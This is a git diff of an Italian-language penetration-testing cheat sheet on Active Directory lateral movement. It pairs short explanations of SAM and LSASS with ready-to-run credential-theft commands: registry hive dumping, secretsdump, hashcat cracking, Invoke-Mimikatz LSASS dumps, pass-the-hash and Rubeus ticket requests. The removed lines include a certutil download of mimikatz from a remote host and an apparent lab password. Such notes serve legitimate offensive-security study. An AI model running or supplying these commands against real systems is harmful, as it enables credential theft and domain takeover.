@@ -226,11 +226,10 @@ net user <username> <password> /add /Y   && net localgroup administrators <usern
 ```
 # Lateral-Movement
 ## Archiviazione e recupero credenziali memorizzate [Local Admin nella macchina]
-### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
-### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.
-## Prerequisito: Devi essere Local Domain Admin dentro la macchina exploitata 
+## Il database Security Account Manager (SAM) è dove Windows memorizza le informazioni relative agli account degli utenti. Memorizza i nomi utente e gli hash delle password degli utenti e viene utilizzato per autenticare gli utenti quando cercano di effettuare l’accesso e fornire la password.
+## LSASS è un processo in modalità utente responsabile della politica di sicurezza del sistema locale (ad esempio quali utenti sono autorizzati ad accedere alla macchina, politiche di password, i privilegi concessi a utenti e gruppi e le impostazioni di controllo della sicurezza del sistema). Il servizio LSASS (Local Security Authority Subsystem Service) archivia le credenziali in memoria per conto degli utenti con sessioni di Windows attive. Le credenziali archiviate consentono agli utenti di accedere senza problemi alle risorse di rete, come condivisioni di file, cassette postali di Exchange Server e siti di SharePoint, senza reinserire le proprie credenziali per ciascun servizio remoto.
 
-- Uso reg per recupero NTLM
+- Estrazioen dal registro per recupero NTLM dal database SAM
 ```
 reg save HKLM\sam sam
 
@@ -244,21 +243,21 @@ hashcat -m 1000 -a 3 hash.txt rockyou.txt
 
 o 
 
-impacket-secretsdump -sam sam -security security -system system
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 
 hashcat -m 1000 -a 3 hash.txt rockyou.txt
 ```
-- Con mimikatz eseguibile (mimikatz.exe)
+
+- Dump Credentials della macchina locale
 ```
-certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+powershell -ep bypass
 
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
+Import-Module Invoke-Mimikatz.ps1
 
-impacket-psexec username:password@IP
-
-xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
+Invoke-Mimikatz -DumpCreds
 ```
-- Con Invoke-Mimikatz
+
+- Dump Credentials from lsass
 ```
 powershell -ep bypass
 
@@ -266,6 +265,7 @@ Import-Module Invoke-Mimikatz.ps1
 
 Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '
 ```
+
 - Mimikatz pass the Hash
 ```
 powershell -ep bypass
@@ -274,6 +274,7 @@ Import-Module Invoke-Mimikatz.ps1
 
 Invoke-Mimikatz -Command '"sekurlsa::pth" "/user:Administrator" "/domain:dollarcorp.moneycorp.local" "/ntlm:<ntlmhash>" "/run:powershell.exe"'
 ```
+
 o
 ```
 Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
